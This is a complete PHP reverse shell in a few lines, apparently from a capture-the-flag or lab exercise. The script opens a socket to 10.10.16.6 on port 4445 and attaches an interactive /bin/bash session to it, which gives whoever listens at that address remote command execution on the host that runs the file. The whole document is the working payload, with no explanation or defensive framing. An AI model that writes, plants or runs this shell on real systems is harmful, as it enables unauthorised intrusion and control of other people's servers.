<?php
$ip = '10.10.16.6';
$port = 4445;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
